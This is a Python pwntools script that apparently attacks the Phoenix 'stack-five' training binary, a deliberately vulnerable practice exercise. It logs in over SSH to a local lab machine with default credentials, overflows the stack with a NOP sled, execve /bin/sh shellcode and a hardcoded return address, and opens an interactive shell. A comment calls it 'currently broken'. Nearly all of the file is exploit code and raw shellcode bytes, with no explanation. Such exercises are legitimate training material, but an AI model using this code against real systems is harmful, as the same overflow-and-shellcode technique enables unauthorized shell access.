from pwn import *
# currently broken
s = ssh(host='localhost',user='user',password='user',port=2222)
r = s.process('/opt/phoenix/amd64/stack-five')
context.arch = 'amd64'
offset = 0x80
#payload = b'\x90'*(offset)+asm(f'jmp $+{8+6}')+b'\x90'*6+p64(0x7fffffffe5e0)+asm(shellcraft.sh())
shellcode = asm(shellcraft.sh())
#shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
#print(shellcode,len(shellcode))
payload = b'\x90'*(offset+8-len(shellcode))+shellcode+p64(0x7fffffffe5e0)
print(offset+8,len(shellcode))
s.write('/tmp/payload',payload)
print(payload)
r.sendline(payload)
r.interactive()

